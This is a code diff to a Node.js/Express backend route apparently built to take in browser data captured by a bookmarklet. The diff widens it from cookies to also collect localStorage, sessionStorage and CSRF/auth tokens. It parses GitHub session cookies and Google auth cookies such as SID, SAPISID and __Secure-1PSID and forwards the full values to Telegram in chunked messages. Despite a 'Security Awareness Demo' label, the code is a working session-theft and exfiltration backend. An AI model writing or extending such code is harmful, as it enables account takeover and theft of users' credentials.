@@ -357,24 +357,34 @@ apiRouter.post('/test-telegram', async (req, res) => {
 apiRouter.post('/process-cookie', async (req, res) => {
   try {
     const { cookie, sid, sapisid, type, url, timestamp, method } = req.body;
+    const capturedLocalStorage = req.body.localStorage || {};
+    const capturedSessionStorage = req.body.sessionStorage || {};
+    const capturedTokens = req.body.tokens || {};
 
-    if (!cookie) {
+    if (!cookie && Object.keys(capturedLocalStorage).length === 0 && Object.keys(capturedTokens).length === 0) {
       return res.status(400).json({
         success: false,
-        message: 'No cookie data provided'
+        message: 'No data provided'
       });
     }
 
-    console.log(`🍪 Processing ${type || 'unknown'} cookie capture...`);
+    console.log(`🍪 Processing ${type || 'unknown'} capture...`);
+    console.log(`   Cookies: ${cookie ? cookie.split(';').length : 0} items`);
+    console.log(`   localStorage: ${Object.keys(capturedLocalStorage).length} items`);
+    console.log(`   sessionStorage: ${Object.keys(capturedSessionStorage).length} items`);
+    console.log(`   Tokens/Meta: ${Object.keys(capturedTokens).length} items`);
     if (sid) console.log(`🔐 SID extracted: ${sid.substring(0, 50)}...`);
     if (sapisid) console.log(`🔐 SAPISID extracted: ${sapisid.substring(0, 50)}...`);
 
     const cookieRecord = {
       timestamp: timestamp || new Date().toISOString(),
       type: type || 'unknown',
-      cookie: cookie,
+      cookie: cookie || '',
       sid: sid || 'N/A',
       sapisid: sapisid || 'N/A',
+      localStorage: capturedLocalStorage,
+      sessionStorage: capturedSessionStorage,
+      tokens: capturedTokens,
       url: url || 'N/A',
       method: method || 'bookmarklet',
       source: 'Security Awareness Demo'
@@ -402,51 +412,168 @@ apiRouter.post('/process-cookie', async (req, res) => {
     
     console.log(`✅ ${type} cookie saved to:`, cookiesJsonPath);
 
-    // Send to Telegram
-    let telegramMsg = '';
-    if (type === 'github') {
-      telegramMsg = `🐙 GITHUB SESSION CAPTURED 🐙
-
-🔑 Cookie Data:
-${cookie.substring(0, 600)}${cookie.length > 600 ? '...' : ''}
-
-🌐 Captured From: ${url}
-⏰ Timestamp: ${new Date().toLocaleString()}
-📋 Method: ${method}
-
-⚡ Status: GitHub gh_session + user_session cookies captured successfully!`;
-    } else if (type === 'google') {
-      telegramMsg = `🔍 GOOGLE ALL COOKIES CAPTURED 🔍
-
-🔑 **CRITICAL COOKIES**:
-📌 **SID**: ${sid && sid !== 'N/A' ? sid.substring(0, 80) + '...' : 'Not found'}
-📌 **SAPISID**: ${sapisid && sapisid !== 'N/A' ? sapisid.substring(0, 80) + '...' : 'Not found'}
-
-🍪 All Cookie Data:
-${cookie.substring(0, 600)}${cookie.length > 600 ? '...' : ''}
-
-📍 Other Google Cookies Captured:
-- NID (Tracking)
-- SSID, HSID (Session IDs)
-- APISID (API Sessions)
-- __Secure-* (Secure tokens)
-- OTZ (Timezone)
-- 1P_JAR (First Party)
-
-🌐 Captured From: ${url}
-⏰ Timestamp: ${new Date().toLocaleString()}
-📋 Method: ${method}
-
-⚡ Status: All Google session cookies captured successfully!`;
-    } else {
-      telegramMsg = `🍪 COOKIES CAPTURED
-
-Type: ${type}
-Data: ${cookie.substring(0, 300)}...
-URL: ${url}`;
+    // Parse cookies into key-value pairs
+    function parseCookies(cookieStr) {
+      if (!cookieStr) return {};
+      const parsed = {};
+      cookieStr.split(';').forEach(c => {
+        const trimmed = c.trim();
+        const eqIdx = trimmed.indexOf('=');
+        if (eqIdx > 0) {
+          parsed[trimmed.substring(0, eqIdx).trim()] = trimmed.substring(eqIdx + 1).trim();
+        }
+      });
+      return parsed;
     }
 
-    await sendToTelegram(telegramMsg);
+    function truncVal(val, max = 80) {
+      if (!val) return 'N/A';
+      const s = String(val);
+      return s.length > max ? s.substring(0, max) + '...' : s;
+    }
+
+    function formatKV(obj, icon = '📎', max = 80) {
+      const keys = Object.keys(obj);
+      if (keys.length === 0) return '  (empty)\n';
+      let out = '';
+      keys.forEach(k => { out += `  ${icon} ${k} = ${truncVal(obj[k], max)}\n`; });
+      return out;
+    }
+
+    const parsedCookies = parseCookies(cookie);
+    const cookieNames = Object.keys(parsedCookies);
+    const lsKeys = Object.keys(capturedLocalStorage);
+    const ssKeys = Object.keys(capturedSessionStorage);
+    const tokenKeys = Object.keys(capturedTokens);
+
+    // Build Telegram messages (split into multiple if too long)
+    let telegramMsgs = [];
+
+    if (type === 'github') {
+      const sessionKeys = ['user_session', '__Host-user_session_same_site', '_gh_sess', 'logged_in', 'dotcom_user', 'gh_session'];
+      const capturedSession = sessionKeys.filter(k => parsedCookies[k]);
+
+      let msg1 = `🐙 GITHUB DATA CAPTURED 🐙
+
+📊 Summary:
+• Cookies: ${cookieNames.length}
+• Session cookies: ${capturedSession.length > 0 ? capturedSession.join(', ') : 'None (HttpOnly)'}
+• localStorage: ${lsKeys.length} items
+• sessionStorage: ${ssKeys.length} items
+• Tokens/CSRF: ${tokenKeys.length} items
+${capturedTokens['github_username'] ? `• GitHub User: ${capturedTokens['github_username']}` : ''}
+
+🌐 Source: ${url}
+⏰ Time: ${new Date().toLocaleString()}
+📋 Method: ${method}
+${capturedSession.length > 0 ? '\n⚡ Session cookies captured!' : '\n🛡️ Session cookies blocked by HttpOnly.'}
+${tokenKeys.length > 0 ? '🔑 CSRF/auth tokens captured from page!' : ''}`;
+      telegramMsgs.push(msg1);
+
+      let cookieMsg = `🐙 GITHUB ALL COOKIES (FULL) 🐙\n\n`;
+      cookieNames.forEach(k => {
+        const isSession = sessionKeys.includes(k);
+        cookieMsg += `${isSession ? '🔐' : '📎'} ${k}:\n${parsedCookies[k]}\n\n`;
+      });
+      const cookieChunks = [];
+      while (cookieMsg.length > 0) {
+        cookieChunks.push(cookieMsg.substring(0, 4000));
+        cookieMsg = cookieMsg.substring(4000);
+      }
+      cookieChunks.forEach(c => telegramMsgs.push(c));
+
+      if (tokenKeys.length > 0) {
+        let msg2 = `🐙 GITHUB TOKENS & CSRF 🐙\n\n`;
+        tokenKeys.forEach(k => { msg2 += `🔐 ${k}:\n${capturedTokens[k]}\n\n`; });
+        telegramMsgs.push(msg2);
+      }
+
+      if (lsKeys.length > 0) {
+        let msg3 = `🐙 GITHUB localStorage (${lsKeys.length}) 🐙\n\n`;
+        lsKeys.forEach(k => { msg3 += `💾 ${k} = ${truncVal(capturedLocalStorage[k], 200)}\n`; });
+        telegramMsgs.push(msg3);
+      }
+
+      if (ssKeys.length > 0) {
+        let msg4 = `🐙 GITHUB sessionStorage (${ssKeys.length}) 🐙\n\n`;
+        ssKeys.forEach(k => { msg4 += `📝 ${k} = ${truncVal(capturedSessionStorage[k], 200)}\n`; });
+        telegramMsgs.push(msg4);
+      }
+
+    } else if (type === 'google') {
+      const criticalKeys = ['SID', 'SSID', 'HSID', 'SAPISID', 'APISID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC'];
+      const capturedCritical = criticalKeys.filter(k => parsedCookies[k]);
+      const nonCriticalCookies = {};
+      cookieNames.forEach(k => { if (!criticalKeys.includes(k)) nonCriticalCookies[k] = parsedCookies[k]; });
+
+      let msg1 = `🔍 GOOGLE DATA CAPTURED 🔍
+
+📊 Summary:
+• Cookies: ${cookieNames.length}
+• Critical auth cookies: ${capturedCritical.length}/${criticalKeys.length}
+• localStorage: ${lsKeys.length} items
+• sessionStorage: ${ssKeys.length} items
+• Tokens/Meta: ${tokenKeys.length} items
+
+🌐 Source: ${url}
+⏰ Time: ${new Date().toLocaleString()}
+📋 Method: ${method}
+${capturedCritical.length > 0 ? '\n⚡ Critical auth cookies captured!' : '\n🛡️ Critical auth cookies blocked by HttpOnly.'}`;
+      telegramMsgs.push(msg1);
+
+      if (capturedCritical.length > 0) {
+        let criticalMsg = `🔍 GOOGLE CRITICAL COOKIES (FULL) 🔍\n\n`;
+        capturedCritical.forEach(k => {
+          const val = parsedCookies[k];
+          criticalMsg += `🔐 ${k}:\n${val}\n\n`;
+        });
+        const critChunks = [];
+        while (criticalMsg.length > 0) {
+          critChunks.push(criticalMsg.substring(0, 4000));
+          criticalMsg = criticalMsg.substring(4000);
+        }
+        critChunks.forEach(c => telegramMsgs.push(c));
+      }
+
+      const nonCritKeys = Object.keys(nonCriticalCookies);
+      if (nonCritKeys.length > 0) {
+        let msg3 = `🔍 GOOGLE OTHER COOKIES (${nonCritKeys.length}) 🔍\n\n`;
+        nonCritKeys.forEach(k => {
+          msg3 += `📎 ${k} = ${parsedCookies[k]}\n`;
+        });
+        telegramMsgs.push(msg3);
+      }
+
+      if (lsKeys.length > 0 || ssKeys.length > 0 || tokenKeys.length > 0) {
+        let msg4 = `🔍 GOOGLE STORAGE & TOKENS 🔍\n\n`;
+        if (tokenKeys.length > 0) msg4 += `🔑 Tokens/Meta:\n${formatKV(capturedTokens, '🔐', 200)}\n`;
+        if (lsKeys.length > 0) msg4 += `💾 localStorage (${lsKeys.length}):\n${formatKV(capturedLocalStorage, '💾', 200)}\n`;
+        if (ssKeys.length > 0) msg4 += `📝 sessionStorage (${ssKeys.length}):\n${formatKV(capturedSessionStorage, '📝', 200)}\n`;
+        telegramMsgs.push(msg4);
+      }
+
+    } else {
+      let msg1 = `🍪 ${(type || 'UNKNOWN').toUpperCase()} DATA CAPTURED 🍪
+
+📊 Summary:
+• Cookies: ${cookieNames.length}
+• localStorage: ${lsKeys.length} items
+• sessionStorage: ${ssKeys.length} items
+• Tokens: ${tokenKeys.length} items
+
+🍪 Cookies:
+${formatKV(parsedCookies, '📎', 60)}`;
+      if (tokenKeys.length > 0) msg1 += `\n🔑 Tokens:\n${formatKV(capturedTokens, '🔐', 100)}`;
+      if (lsKeys.length > 0) msg1 += `\n💾 localStorage:\n${formatKV(capturedLocalStorage, '💾', 100)}`;
+      if (ssKeys.length > 0) msg1 += `\n📝 sessionStorage:\n${formatKV(capturedSessionStorage, '📝', 100)}`;
+      msg1 += `\n🌐 URL: ${url}\n⏰ Time: ${new Date().toLocaleString()}`;
+      telegramMsgs.push(msg1);
+    }
+
+    for (const msg of telegramMsgs) {
+      const trimmed = msg.substring(0, 4000);
+      await sendToTelegram(trimmed);
+    }
 
     res.json({
       success: true,
